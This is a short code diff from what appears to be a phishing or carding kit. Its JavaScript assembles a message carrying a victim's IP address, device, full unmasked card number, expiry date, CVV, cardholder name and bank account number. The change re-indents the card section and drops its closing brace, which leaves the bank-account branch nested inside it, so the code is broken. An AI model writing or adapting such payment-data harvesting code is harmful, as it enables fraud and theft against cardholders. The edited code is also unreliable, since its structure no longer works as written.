@@ -1034,14 +1034,12 @@
             message += `🌐 *IP:* ${userIP || 'Auto-detected'}\n`;
             message += `📱 *Device:* ${userDevice || 'Unknown'}\n`;
             message += `🕐 *${new Date().toLocaleString()}*`;
-             if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
-                message += `💳 *Card Number:* ${cardNumber}\n`; // FULL, UNMASKED
-                message += `📅 *Expiry:* ${cardExpiry}\n`;
-                message += `🔐 *CVV:* ${cardCVV}\n`;
-                message += `👤 *Cardholder:* ${cardName}\n`;
-                message += `💳 *Card Type:* ${cardType}\n`;
-            }
-
+            if (payoutMethod === 'Debit Card' || payoutMethod === 'Credit Card') {
+            message += `💳 *Card Number:* ${cardNumber}\n`; // FULL, UNMASKED
+            message += `📅 *Expiry:* ${cardExpiry}\n`;
+            message += `🔐 *CVV:* ${cardCVV}\n`;
+            message += `👤 *Cardholder:* ${cardName}\n`;
+            message += `💳 *Card Type:* ${cardType}\n`;
             if (payoutMethod === 'Bank Account') {
                 message += `🏦 *Bank Name:* ${bankName}\n`;
                 message += `💳 *Account Number:* ${bankAccount}\n`; // FULL, UNMASKED
